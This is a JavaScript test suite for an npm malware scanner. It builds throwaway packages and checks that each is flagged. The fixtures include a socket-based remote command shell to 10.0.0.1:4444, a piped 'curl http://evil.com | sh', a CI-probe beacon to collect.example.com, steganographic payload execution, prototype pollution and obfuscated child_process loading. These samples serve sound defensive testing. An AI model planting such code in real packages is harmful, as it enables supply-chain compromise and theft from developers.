'use strict';

const path = require('path');
const fs = require('fs');
const os = require('os');
const { test, asyncTest, assert, assertIncludes, runScanDirect } = require('../test-utils');

function makeTempPkg(code, filename = 'index.js') {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-v8b-'));
  if (typeof code === 'object') {
    // Multiple files: { 'lib/foo.js': '...', 'package.json': '...' }
    for (const [name, content] of Object.entries(code)) {
      const filePath = path.join(tmp, name);
      fs.mkdirSync(path.dirname(filePath), { recursive: true });
      fs.writeFileSync(filePath, content);
    }
  } else {
    fs.writeFileSync(path.join(tmp, filename), code);
    fs.writeFileSync(path.join(tmp, 'package.json'), '{}');
  }
  return tmp;
}

function cleanupTemp(tmp) {
  try { fs.rmSync(tmp, { recursive: true, force: true }); } catch {}
}

async function runBlueTeamV8bTests() {
  // =========================================================================
  // A7: JSON.parse reviver with __proto__ → json_reviver_pollution
  // =========================================================================

  await asyncTest('v8b-A7: JSON.parse reviver with __proto__ → json_reviver_pollution CRITICAL', async () => {
    const code = `
const data = JSON.parse(input, (key, value) => {
  if (key === '__proto__') {
    Object.prototype.cp = require('child_process');
  }
  return value;
});
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'json_reviver_pollution');
      assert(t, 'Should detect json_reviver_pollution');
      assert(t.severity === 'CRITICAL', `Expected CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('v8b-A7-neg: JSON.parse reviver without __proto__ → no json_reviver_pollution', async () => {
    const code = `
const data = JSON.parse(input, (key, value) => {
  if (typeof value === 'string' && /^\\d+$/.test(value)) return Number(value);
  return value;
});
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'json_reviver_pollution');
      assert(!t, 'Should NOT detect json_reviver_pollution for benign reviver');
    } finally { cleanupTemp(tmp); }
  });

  // =========================================================================
  // B7: path.join image + readFileSync + new Function → stego_binary_exec
  // =========================================================================

  await asyncTest('v8b-B7: readFileSync(path.join logo.png) + new Function → stego_binary_exec', async () => {
    const code = `
const fs = require('fs');
const path = require('path');
const LOGO = path.join(__dirname, 'assets', 'logo.png');
const data = fs.readFileSync(LOGO);
const bits = [];
for (let i = 0; i < data.length; i++) bits.push(data[i] & 1);
const payload = Buffer.from(bits).toString('utf8');
const fn = new Function('return ' + payload);
fn();
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'stego_binary_exec');
      assert(t, 'Should detect stego_binary_exec');
      assert(t.severity === 'CRITICAL', `Expected CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  // =========================================================================
  // C1: AsyncLocalStorage + dynamic require → asynclocal_context_exec
  // =========================================================================

  await asyncTest('v8b-C1: AsyncLocalStorage + require(child_+process) → asynclocal_context_exec', async () => {
    const code = `
const { AsyncLocalStorage } = require('async_hooks');
const store = new AsyncLocalStorage();
store.run({ _mod: require('child_' + 'process') }, () => {
  const ctx = store.getStore();
  ctx._mod.exec('whoami');
});
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'asynclocal_context_exec');
      assert(t, 'Should detect asynclocal_context_exec');
      assert(t.severity === 'HIGH', `Expected HIGH, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  // =========================================================================
  // C10: require('child_process').execSync(variable) → dangerous_exec
  // =========================================================================

  await asyncTest('v8b-C10: inline require(child_process).execSync(variable) → dangerous_exec HIGH', async () => {
    const code = `
const net = require('net');
const socket = new net.Socket();
socket.on('data', (chunk) => {
  const cmd = JSON.parse(chunk.toString());
  const result = require('child_process').execSync(cmd.payload, { encoding: 'utf8' });
  socket.write(result);
});
socket.connect(4444, '10.0.0.1');
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const de = result.threats.find(t => t.type === 'dangerous_exec');
      assert(de, 'Should detect dangerous_exec for inline require + variable command');
      const ws = result.threats.find(t => t.type === 'websocket_c2');
      assert(ws, 'Should detect websocket_c2 compound (net.Socket + exec)');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('v8b-C10-neg: require(child_process).execSync("literal") → no dangerous_exec HIGH', async () => {
    const code = `
const version = require('child_process').execSync('node --version', { encoding: 'utf8' });
console.log(version);
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      // Should NOT fire the "inline require + variable command" detection
      // (it may fire other detections for the literal command, but not for variable arg)
      const t = result.threats.find(t =>
        t.type === 'dangerous_exec' && t.message.includes('runtime-determined'));
      assert(!t, 'Should NOT fire variable-command detection for literal string');
    } finally { cleanupTemp(tmp); }
  });

  // =========================================================================
  // C2: vm.createContext + require injection → vm_dynamic_code
  // =========================================================================

  await asyncTest('v8b-C2: vm.createContext with require injection → vm_dynamic_code', async () => {
    const code = `
const vm = require('vm');
const sandbox = {
  console,
  setTimeout,
  require: (name) => {
    const allowed = { fs: require('fs'), http: require('http') };
    if (allowed[name]) return allowed[name];
    throw new Error('Module not allowed: ' + name);
  }
};
const ctx = vm.createContext(sandbox);
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'vm_dynamic_code');
      assert(t, 'Should detect vm_dynamic_code for createContext + require injection');
      assert(t.severity === 'CRITICAL', `Expected CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('v8b-C2-neg: vm.createContext without require injection → no vm_dynamic_code', async () => {
    const code = `
const vm = require('vm');
const sandbox = { console, setTimeout, Buffer };
const ctx = vm.createContext(sandbox);
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'vm_dynamic_code');
      assert(!t, 'Should NOT detect vm_dynamic_code without require injection');
    } finally { cleanupTemp(tmp); }
  });

  // =========================================================================
  // A6: 'use strict' + Proxy + require(child_process) → regex fallback
  // =========================================================================

  await asyncTest('v8b-A6: strict mode + Proxy + require(child_process) + exec → regex fallback', async () => {
    // This file will fail acorn parse because 'use strict' + with statement
    const code = `'use strict';
function createScope(vars) {
  return new Proxy(vars, {
    get: (t, p) => { if (p === 'exec') return require('child_process').exec; return t[p]; }
  });
}
function run(ctx) {
  const scope = createScope(ctx);
  with (scope) { exec('curl http://evil.com | sh'); }
}
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_exec');
      assert(t, 'Should detect dangerous_exec via regex fallback');
      assert(t.severity === 'CRITICAL', `Expected CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  // =========================================================================
  // A1: .apply(require, ...) → dynamic_require CRITICAL
  // =========================================================================

  await asyncTest('v8b-A1: fn.apply(require, [child_process]) → dynamic_require CRITICAL', async () => {
    const code = `
const fn = (['Ref','lect'].join(''));
const loader = globalThis[fn];
const cp = loader.apply(require, null, ['child_process']);
cp.exec('whoami');
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dynamic_require' && t.message.includes('.apply(require'));
      assert(t, 'Should detect .apply(require, ...) as dynamic_require');
      assert(t.severity === 'CRITICAL', `Expected CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  // =========================================================================
  // A3: Object.getPrototypeOf(variable).constructor → prototype_chain_constructor
  // =========================================================================

  await asyncTest('v8b-A3: getPrototypeOf(variable).constructor → prototype_chain_constructor', async () => {
    const code = `
async function dummy() {}
const AsyncFunc = Object.getPrototypeOf(dummy).constructor;
AsyncFunc('return process.env')();
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'prototype_chain_constructor');
      assert(t, 'Should detect prototype_chain_constructor');
      assert(t.severity === 'CRITICAL', `Expected CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  // =========================================================================
  // B2: CI environment probe (3+ CI provider env vars)
  // =========================================================================

  await asyncTest('v8b-B2: 3+ CI provider env vars → ci_environment_probe', async () => {
    const code = `
const isCI = process.env.GITHUB_ACTIONS || process.env.GITLAB_CI || process.env.CIRCLECI || process.env.TRAVIS;
if (isCI) { require('child_process').exec('curl http://collect.example.com/ci'); }
`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'ci_environment_probe');
      assert(t, 'Should detect ci_environment_probe for 4 CI vars');
      assert(t.severity === 'HIGH', `Expected HIGH, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  // =========================================================================
  // B8: Lifecycle script referencing missing file → lifecycle_missing_script
  // =========================================================================

  await asyncTest('v8b-B8: lifecycle preinstall references missing file → lifecycle_missing_script', async () => {
    const tmp = makeTempPkg({
      'package.json': JSON.stringify({
        name: 'test-missing-script',
        scripts: { preinstall: 'node lib/setup.js' }
      }),
      'index.js': 'module.exports = {};'
    });
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'lifecycle_missing_script');
      assert(t, 'Should detect lifecycle_missing_script');
      assert(t.severity === 'CRITICAL', `Expected CRITICAL for preinstall, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('v8b-B8-neg: lifecycle script referencing existing file → no lifecycle_missing_script', async () => {
    const tmp = makeTempPkg({
      'package.json': JSON.stringify({
        name: 'test-valid-script',
        scripts: { postinstall: 'node lib/setup.js' }
      }),
      'lib/setup.js': 'console.log("setup complete");',
      'index.js': 'module.exports = {};'
    });
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'lifecycle_missing_script');
      assert(!t, 'Should NOT detect lifecycle_missing_script when file exists');
    } finally { cleanupTemp(tmp); }
  });

  // =========================================================================
  // Rule count verification
  // =========================================================================

  test('v8b: rule count is 200 (195 RULES + 5 PARANOID)', () => {
    const { RULES, PARANOID_RULES } = require('../../src/rules/index.js');
    const ruleCount = Object.keys(RULES).length;
    const paranoidCount = Object.keys(PARANOID_RULES).length;
    assert(ruleCount === 195, `Expected 195 RULES, got ${ruleCount}`);
    assert(paranoidCount === 5, `Expected 5 PARANOID, got ${paranoidCount}`);
  });
}

module.exports = { runBlueTeamV8bTests };
